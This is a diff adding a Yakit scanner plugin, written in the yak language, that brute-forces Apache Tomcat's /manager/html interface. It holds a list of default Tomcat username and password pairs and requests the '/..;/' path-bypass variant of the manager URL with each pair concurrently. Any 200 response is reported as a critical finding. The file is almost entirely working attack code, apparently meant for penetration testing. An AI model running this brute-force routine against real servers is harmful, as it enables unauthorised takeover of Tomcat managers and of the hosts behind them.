@@ -1,0 +1,204 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// pair
+pairs = str.ParseStringToLines(`admin:
+admin:admanager
+admin:admin
+ADMIN:ADMIN
+admin:adrole1
+admin:adroot
+admin:ads3cret
+admin:adtomcat
+admin:advagrant
+admin:password
+admin:password1
+admin:Password1
+admin:tomcat
+admin:vagrant
+both:admanager
+both:admin
+both:adrole1
+both:adroot
+both:ads3cret
+both:adtomcat
+both:advagrant
+both:tomcat
+cxsdk:kdsxc
+j2deployer:j2deployer
+manager:admanager
+manager:admin
+manager:adrole1
+manager:adroot
+manager:ads3cret
+manager:adtomcat
+manager:advagrant
+manager:manager
+ovwebusr:OvW*busr1
+QCC:QLogic66
+role1:admanager
+role1:admin
+role1:adrole1
+role1:adroot
+role1:ads3cret
+role1:adtomcat
+role1:advagrant
+role1:role1
+role1:tomcat
+role:changethis
+root:admanager
+root:admin
+root:adrole1
+root:adroot
+root:ads3cret
+root:adtomcat
+root:advagrant
+root:changethis
+root:owaspbwa
+root:password
+root:password1
+root:Password1
+root:r00t
+root:root
+root:toor
+tomcat:
+tomcat:admanager
+tomcat:admin
+tomcat:adrole1
+tomcat:adroot
+tomcat:ads3cret
+tomcat:adtomcat
+tomcat:advagrant
+tomcat:changethis
+tomcat:password
+tomcat:password1
+tomcat:s3cret
+tomcat:tomcat
+xampp:xampp
+server_admin:owaspbwa
+admin:owaspbwa
+demo:demo`)
+
+
+# input your yak code
+loglevel("info")
+
+checkLogin = func(swg, addr, pass) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        rsp, req, err = poc.HTTP(`GET /{{rs}}/..;/manager/html HTTP/1.1
+Host: {{params(target)}}
+Authorization: Basic {{base64({{params(userpass)}})}}
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36`, poc.params({"target": addr, "userpass": pass}))
+        if err != nil {
+            return
+        }
+
+        rspIns, err = poc.ParseBytesToHTTPResponse(rsp)
+        if err != nil {
+            return
+        }
+        if rspIns.StatusCode == 200 {
+            yakit.Info("tomcat brute %v %v successfully", addr, pass)
+            risk.NewRisk(
+                addr, risk.payload(pass), risk.severity("critical"), 
+                risk.title(sprintf("Tomcat /manager/html Login[%v]: %v", pass, addr)),
+                risk.title(sprintf("Tomcat /manager/html 登录爆破[%v]: %v", pass, addr)),
+                risk.details({
+                    "request": req,
+                    "password": pass,
+                }), risk.type("brute"),
+            )
+            return            
+        }
+    }
+}
+
+tomcatDefaultPass = func(host, port) {
+    addr = str.HostPort(host, port)
+
+    rsp, req, err = poc.HTTP(`GET /{{rs}}/..;/manager/html HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
+`, poc.params({"target": addr}))
+    if err != nil {
+        yakit.Error("query tomcat manager/html failed: %v", err)
+        return
+    }
+
+    if !str.MatchAllOfRegexp(rsp, "(?i)401 Unauthorized", "(?i)WWW-Authenticate") {
+        return
+    }
+
+    yakit.Info("Start to Check Tomcat: %v", addr)
+    
+
+    swg = sync.NewSizedWaitGroup(5)
+    for _, pair = range pairs {
+        checkLogin(swg, addr, pair)
+    }
+    swg.Wait()
+}
+
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen() {
+        return
+    }
+
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+
+    if result.GetServiceName() != "" {
+        yakit.Info(result.GetServiceName())
+    }
+
+    tomcatDefaultPass(result.Target, result.Port)
+}
+
+/*
+// 具体定义如下：
+type palm/common/fp.(MatchResult) struct {
+      Target: string  
+      Port: int  
+      State: fp.PortState  
+      Reason: string  
+      Fingerprint: *fp.FingerprintInfo  
+  StructMethods(结构方法/函数): 
+  PtrStructMethods(指针结构方法/函数): 
+      func GetBanner() return(string) 
+      func GetCPEs() return([]string) 
+      func GetDomains() return([]string) 
+      func GetHtmlTitle() return(string) 
+      func GetProto() return(fp.TransportProto) 
+      func GetServiceName() return(string) 
+      func IsOpen() return(bool) 
+      func String() return(string) 
+}
+
+
+type palm/common/fp.(FingerprintInfo) struct {
+      IP: string  
+      Port: int  
+      Proto: fp.TransportProto  
+      ServiceName: string  
+      ProductVerbose: string  
+      Info: string  
+      Version: string  
+      Hostname: string  
+      OperationVerbose: string  
+      DeviceType: string  
+      CPEs: []string  
+      Raw: string  
+      Banner: string  
+      CPEFromUrls: map[string][]*webfingerprint.CPE  
+      HttpFlows: []*fp.HTTPFlow  
+  StructMethods(结构方法/函数): 
+  PtrStructMethods(指针结构方法/函数): 
+      func FromRegexp2Match(v1: *regexp2.Match) 
+}
+*/
+
